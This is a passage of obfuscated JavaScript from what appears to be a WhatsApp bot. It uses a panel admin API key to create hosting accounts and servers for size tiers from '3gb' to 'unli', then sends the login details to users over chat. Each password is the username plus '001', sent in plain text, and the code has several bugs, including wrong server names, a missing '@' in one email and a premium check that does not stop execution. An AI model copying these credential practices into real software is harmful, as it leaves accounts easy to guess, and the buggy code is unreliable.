              'first_name': _0x39691d,
              'last_name': _0x39691d,
              'language': 'en',
              'password': _0x500ce2
            })
          });
          let _0xf44bd8 = await _0x4ed7ba.json();
          if (_0xf44bd8.errors) {
            return _0xd6f2c2(JSON.stringify(_0xf44bd8.errors[0x0], null, 0x2));
          }
          let _0x150e43 = _0xf44bd8.attributes;
          let _0x273b45 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x446af1, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0x150e43.id);
          let _0x1a208e = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x150e43.username + "\n🔐 Password: " + _0x500ce2 + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0xbdaec7, {
            'image': {
              'url': 'https://g.top4top.io/p_3194iz70l0.jpg'
            },
            'caption': _0x1a208e
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x35547c = await _0x273b45.json();
          let _0x217423 = _0x35547c.attributes.startup;
          let _0x25b6b5 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x39691d + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0x150e43.id,
              'egg': parseInt(_0x446af1),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x217423,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '2024',
                'swap': 0x0,
                'disk': '2024',
                'io': 0x1f4,
                'cpu': '70'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x20d5c5)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2e61a6 = await _0x25b6b5.json();
          if (_0x2e61a6.errors) {
            return _0x1e35db(JSON.stringify(_0x2e61a6.errors[0x0], null, 0x2));
          }
        }
        break;
      case "3gb":
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x21a04d = _0x2741d2.split(',');
          if (_0x21a04d.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x2bcccb = _0x21a04d[0x0];
          let _0x4f8a8f = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x21a04d[0x1] ? _0x21a04d[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0xe0b9f4.mentionedJid[0x0];
          let _0x2aed07 = global.eggsnya;
          let _0x2f59f2 = global.location;
          let _0x5080ca = _0x2bcccb + "Dray.id.com";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x4f8a8f) {
            return;
          }
          let _0x5e952b = _0x2bcccb + '001';
          let _0xf7b476 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x5080ca,
              'username': _0x2bcccb,
              'first_name': _0x2bcccb,
              'last_name': _0x2bcccb,
              'language': 'en',
              'password': _0x5e952b
            })
          });
          let _0x550957 = await _0xf7b476.json();
          if (_0x550957.errors) {
            return _0xd6f2c2(JSON.stringify(_0x550957.errors[0x0], null, 0x2));
          }
          let _0x8f0b3e = _0x550957.attributes;
          let _0x1dad99 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2aed07, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0x8f0b3e.id);
          let _0x17452 = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x8f0b3e.username + "\n🔐 Password: " + _0x5e952b + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0x4f8a8f, {
            'image': {
              'url': "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            'caption': _0x17452
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x17c4ad = await _0x1dad99.json();
          let _0xae0c46 = _0x17c4ad.attributes.startup;
          let _0x7034a3 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x2bcccb + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0x8f0b3e.id,
              'egg': parseInt(_0x2aed07),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0xae0c46,
              'environment': {
                'INST': 'npm',
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "3024",
                'swap': 0x0,
                'disk': "3024",
                'io': 0x1f4,
                'cpu': '80'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x2f59f2)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x8a1d26 = await _0x7034a3.json();
          if (_0x8a1d26.errors) {
            return _0x1e35db(JSON.stringify(_0x8a1d26.errors[0x0], null, 0x2));
          }
        }
        break;
      case "4gb":
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0xe57100 = _0x2741d2.split(',');
          if (_0xe57100.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x5c2a2e = _0xe57100[0x0];
          let _0x41ca75 = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0xe57100[0x1] ? _0xe57100[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0xe0b9f4.mentionedJid[0x0];
          let _0xa6bdfc = global.eggsnya;
          let _0x596027 = global.location;
          let _0x574cd6 = _0x5c2a2e + "@Dray.id";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x41ca75) {
            return;
          }
          let _0x22fe4d = _0x5c2a2e + "001";
          let _0x4aaa70 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x574cd6,
              'username': _0x5c2a2e,
              'first_name': _0x5c2a2e,
              'last_name': _0x5c2a2e,
              'language': 'en',
              'password': _0x22fe4d
            })
          });
          let _0x2158a3 = await _0x4aaa70.json();
          if (_0x2158a3.errors) {
            return _0xd6f2c2(JSON.stringify(_0x2158a3.errors[0x0], null, 0x2));
          }
          let _0x30a1c4 = _0x2158a3.attributes;
          let _0x3c63e9 = await fetch(domain + "/api/application/nests/5/eggs/" + _0xa6bdfc, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0x30a1c4.id);
          let _0x3bcaa0 = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x30a1c4.username + "\n🔐 Password: " + _0x22fe4d + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0x41ca75, {
            'image': {
              'url': 'https://g.top4top.io/p_3194iz70l0.jpg'
            },
            'caption': _0x3bcaa0
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x2ac30c = await _0x3c63e9.json();
          let _0x4f3b17 = _0x2ac30c.attributes.startup;
          let _0x16968c = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x5c2a2e + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0x30a1c4.id,
              'egg': parseInt(_0xa6bdfc),
              'docker_image': 'ghcr.io/parkervcp/yolks:nodejs_18',
              'startup': _0x4f3b17,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '4024',
                'swap': 0x0,
                'disk': "4024",
                'io': 0x1f4,
                'cpu': '80'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x596027)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5b8071 = await _0x16968c.json();
          if (_0x5b8071.errors) {
            return _0x1e35db(JSON.stringify(_0x5b8071.errors[0x0], null, 0x2));
          }
        }
        break;
      case '5gb':
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x3a6bb9 = _0x2741d2.split(',');
          if (_0x3a6bb9.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x1f9374 = _0x3a6bb9[0x0];
          let _0xceba4d = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x3a6bb9[0x1] ? _0x3a6bb9[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0xe0b9f4.mentionedJid[0x0];
          let _0x438500 = global.eggsnya;
          let _0x410a6e = global.location;
          let _0x4541f5 = _0x1f9374 + "@Dray.id";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0xceba4d) {
            return;
          }
          let _0x3f0da2 = _0x1f9374 + "001";
          let _0xd7a1de = await fetch(domain + "/api/application/users", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x4541f5,
              'username': _0x1f9374,
              'first_name': _0x1f9374,
              'last_name': _0x1f9374,
              'language': 'en',
              'password': _0x3f0da2
            })
          });
          let _0x22c265 = await _0xd7a1de.json();
          if (_0x22c265.errors) {
            return _0xd6f2c2(JSON.stringify(_0x22c265.errors[0x0], null, 0x2));
          }
          let _0x1f1b61 = _0x22c265.attributes;
          let _0x218df1 = await fetch(domain + '/api/application/nests/5/eggs/' + _0x438500, {
            'method': "GET",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0x1f1b61.id);
          let _0x36f231 = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x1f1b61.username + "\n🔐 Password: " + _0x3f0da2 + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0xceba4d, {
            'image': {
              'url': "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            'caption': _0x36f231
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x22d89c = await _0x218df1.json();
          let _0x500b08 = _0x22d89c.attributes.startup;
          let _0x17f55a = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x1f9374 + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0x1f1b61.id,
              'egg': parseInt(_0x438500),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x500b08,
              'environment': {
                'INST': 'npm',
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "5024",
                'swap': 0x0,
                'disk': '5024',
                'io': 0x1f4,
                'cpu': '100'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x410a6e)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3cd351 = await _0x17f55a.json();
          if (_0x3cd351.errors) {
            return _0x1e35db(JSON.stringify(_0x3cd351.errors[0x0], null, 0x2));
          }
        }
        break;
      case "6gb":
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x192073 = _0x2741d2.split(',');
          if (_0x192073.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x1cdde6 = _0x192073[0x0];
          let _0x599799 = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x192073[0x1] ? _0x192073[0x1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : _0xe0b9f4.mentionedJid[0x0];
          let _0x3f9070 = global.eggsnya;
          let _0x1bf652 = global.location;
          let _0x44d5d5 = _0x1cdde6 + '@Dray.id';
          akunlo = 'https://g.top4top.io/p_3194iz70l0.jpg';
          if (!_0x599799) {
            return;
          }
          let _0x378e8d = _0x1cdde6 + "001";
          let _0x362f3b = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x44d5d5,
              'username': _0x1cdde6,
              'first_name': _0x1cdde6,
              'last_name': _0x1cdde6,
              'language': 'en',
              'password': _0x378e8d
            })
          });
          let _0x460a84 = await _0x362f3b.json();
          if (_0x460a84.errors) {
            return _0xd6f2c2(JSON.stringify(_0x460a84.errors[0x0], null, 0x2));
          }
          let _0xefc475 = _0x460a84.attributes;
          let _0x5cc79c = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3f9070, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0xefc475.id);
          let _0x472434 = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0xefc475.username + "\n🔐 Password: " + _0x378e8d + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0x599799, {
            'image': {
              'url': "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            'caption': _0x472434
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x2bbdc9 = await _0x5cc79c.json();
          let _0x13b042 = _0x2bbdc9.attributes.startup;
          let _0x11e472 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x1cdde6 + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0xefc475.id,
              'egg': parseInt(_0x3f9070),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x13b042,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "6024",
                'swap': 0x0,
                'disk': '6024',
                'io': 0x1f4,
                'cpu': "160"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x1bf652)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3cc55a = await _0x11e472.json();
          if (_0x3cc55a.errors) {
            return _0x1e35db(JSON.stringify(_0x3cc55a.errors[0x0], null, 0x2));
          }
        }
        break;
      case "7gb":
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x538577 = _0x2741d2.split(',');
          if (_0x538577.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x150a2d = _0x538577[0x0];
          let _0x6421c0 = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x538577[0x1] ? _0x538577[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0xe0b9f4.mentionedJid[0x0];
          let _0x1cffca = global.eggsnya;
          let _0x16cf72 = global.location;
          let _0x449911 = _0x150a2d + '@Dray.id';
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x6421c0) {
            return;
          }
          let _0x272dc7 = _0x150a2d + "001";
          let _0x1ecc2e = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': 'application/json',
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x449911,
              'username': _0x150a2d,
              'first_name': _0x150a2d,
              'last_name': _0x150a2d,
              'language': 'en',
              'password': _0x272dc7
            })
          });
          let _0x50bc19 = await _0x1ecc2e.json();
          if (_0x50bc19.errors) {
            return _0xd6f2c2(JSON.stringify(_0x50bc19.errors[0x0], null, 0x2));
          }
          let _0x3a5753 = _0x50bc19.attributes;
          let _0x583739 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x1cffca, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0x3a5753.id);
          let _0x417b0e = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x3a5753.username + "\n🔐 Password: " + _0x272dc7 + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0x6421c0, {
            'image': {
              'url': "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            'caption': _0x417b0e
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x39fb72 = await _0x583739.json();
          let _0x4c001d = _0x39fb72.attributes.startup;
          let _0x2f7381 = await fetch(domain + "/api/application/servers", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x150a2d + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0x3a5753.id,
              'egg': parseInt(_0x1cffca),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x4c001d,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "7024",
                'swap': 0x0,
                'disk': '7024',
                'io': 0x1f4,
                'cpu': "170"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x16cf72)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x447369 = await _0x2f7381.json();
          if (_0x447369.errors) {
            return _0x1e35db(JSON.stringify(_0x447369.errors[0x0], null, 0x2));
          }
        }
        break;
      case "8gb":
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x5a51cb = _0x2741d2.split(',');
          if (_0x5a51cb.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x9e8202 = _0x5a51cb[0x0];
          let _0x11d227 = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x5a51cb[0x1] ? _0x5a51cb[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0xe0b9f4.mentionedJid[0x0];
          let _0x246609 = global.eggsnya;
          let _0x1e7b49 = global.location;
          let _0x7d6171 = _0x9e8202 + "@Dray.id";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x11d227) {
            return;
          }
          let _0x4542be = _0x9e8202 + "001";
          let _0x3ce5e3 = await fetch(domain + '/api/application/users', {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': 'application/json',
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x7d6171,
              'username': _0x9e8202,
              'first_name': _0x9e8202,
              'last_name': _0x9e8202,
              'language': 'en',
              'password': _0x4542be
            })
          });
          let _0x37bbaf = await _0x3ce5e3.json();
          if (_0x37bbaf.errors) {
            return _0xd6f2c2(JSON.stringify(_0x37bbaf.errors[0x0], null, 0x2));
          }
          let _0x578fe8 = _0x37bbaf.attributes;
          let _0xa133d0 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x246609, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0x578fe8.id);
          let _0x9512d7 = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x578fe8.username + "\n🔐 Password: " + _0x4542be + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0x11d227, {
            'image': {
              'url': 'https://g.top4top.io/p_3194iz70l0.jpg'
            },
            'caption': _0x9512d7
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x2fd888 = await _0xa133d0.json();
          let _0x48f414 = _0x2fd888.attributes.startup;
          let _0x43aa50 = await fetch(domain + "/api/application/servers", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x9e8202 + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0x578fe8.id,
              'egg': parseInt(_0x246609),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x48f414,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '8024',
                'swap': 0x0,
                'disk': '8024',
                'io': 0x1f4,
                'cpu': "180"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0x1e7b49)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3164e7 = await _0x43aa50.json();
          if (_0x3164e7.errors) {
            return _0x1e35db(JSON.stringify(_0x3164e7.errors[0x0], null, 0x2));
          }
        }
        break;
      case "9gb":
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x5a5297 = _0x2741d2.split(',');
          if (_0x5a5297.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x3d4bdb = _0x5a5297[0x0];
          let _0x2622fa = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x5a5297[0x1] ? _0x5a5297[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0xe0b9f4.mentionedJid[0x0];
          let _0x3bc90f = global.eggsnya;
          let _0xd7fcfd = global.location;
          let _0x27bf99 = _0x3d4bdb + "@Dray.id";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x2622fa) {
            return;
          }
          let _0x251274 = _0x3d4bdb + "001";
          let _0x31702d = await fetch(domain + '/api/application/users', {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x27bf99,
              'username': _0x3d4bdb,
              'first_name': _0x3d4bdb,
              'last_name': _0x3d4bdb,
              'language': 'en',
              'password': _0x251274
            })
          });
          let _0x316b39 = await _0x31702d.json();
          if (_0x316b39.errors) {
            return _0xd6f2c2(JSON.stringify(_0x316b39.errors[0x0], null, 0x2));
          }
          let _0x5444f2 = _0x316b39.attributes;
          let _0x1428c1 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3bc90f, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0x5444f2.id);
          let _0x28aebe = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x5444f2.username + "\n🔐 Password: " + _0x251274 + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0x2622fa, {
            'image': {
              'url': "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            'caption': _0x28aebe
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x3480df = await _0x1428c1.json();
          let _0x2cc69f = _0x3480df.attributes.startup;
          let _0x48fcbc = await fetch(domain + "/api/application/servers", {
            'method': 'POST',
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x3d4bdb + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0x5444f2.id,
              'egg': parseInt(_0x3bc90f),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x2cc69f,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "9024",
                'swap': 0x0,
                'disk': "9024",
                'io': 0x1f4,
                'cpu': '190'
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x5
              },
              'deploy': {
                'locations': [parseInt(_0xd7fcfd)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2496af = await _0x48fcbc.json();
          if (_0x2496af.errors) {
            return _0x1e35db(JSON.stringify(_0x2496af.errors[0x0], null, 0x2));
          }
        }
        break;
      case "unli":
        {
          if (!_0x37e4b2) {
            _0xd6f2c2(mess.only.premium);
          }
          if (!_0xd5b998) {
            return _0xd6f2c2(mess.only.owner);
          }
          let _0x390df9 = _0x2741d2.split(',');
          if (_0x390df9.length < 0x2) {
            return _0xd6f2c2("Format salah!\nPenggunaan:\n" + (_0x270d27 + _0x539f0c) + " user,nomer");
          }
          let _0x5e3251 = _0x390df9[0x0];
          let _0x8205c7 = _0xe0b9f4.quoted ? _0xe0b9f4.quoted.sender : _0x390df9[0x1] ? _0x390df9[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0xe0b9f4.mentionedJid[0x0];
          let _0x2a4de3 = global.eggsnya;
          let _0x4870b9 = global.location;
          let _0x570b4f = _0x5e3251 + "@Dray.id";
          akunlo = "https://g.top4top.io/p_3194iz70l0.jpg";
          if (!_0x8205c7) {
            return;
          }
          let _0x2f8f79 = _0x5e3251 + "001";
          let _0x7f2e95 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x570b4f,
              'username': _0x5e3251,
              'first_name': _0x5e3251,
              'last_name': _0x5e3251,
              'language': 'en',
              'password': _0x2f8f79
            })
          });
          let _0x587339 = await _0x7f2e95.json();
          if (_0x587339.errors) {
            return _0xd6f2c2(JSON.stringify(_0x587339.errors[0x0], null, 0x2));
          }
          let _0x1bbcde = _0x587339.attributes;
          let _0x3d052d = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2a4de3, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0xd6f2c2("User ID: " + _0x1bbcde.id);
          let _0x1897bb = "Hai @" + _0xe0b9f4.sender.split('@')[0x0] + "\n Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩\n\n👤 Username: " + _0x1bbcde.username + "\n🔐 Password: " + _0x2f8f79 + "\n🔗 Url: " + domain;
          _0x1e35db.sendMessage(_0x8205c7, {
            'image': {
              'url': "https://g.top4top.io/p_3194iz70l0.jpg"
            },
            'caption': _0x1897bb
          }, {
            'quoted': _0xe0b9f4
          });
          let _0x567cf7 = await _0x3d052d.json();
          let _0x3f5550 = _0x567cf7.attributes.startup;
          let _0x24c9b0 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x5e3251 + " - 1gb",
              'description': "Create with " + namabot,
              'user': _0x1bbcde.id,
              'egg': parseInt(_0x2a4de3),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x3f5550,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': '0',
                'swap': 0x0,
                'disk': '0',
                'io': 0x1f4,
                'cpu': '0'
              },
              'feature_limits': {
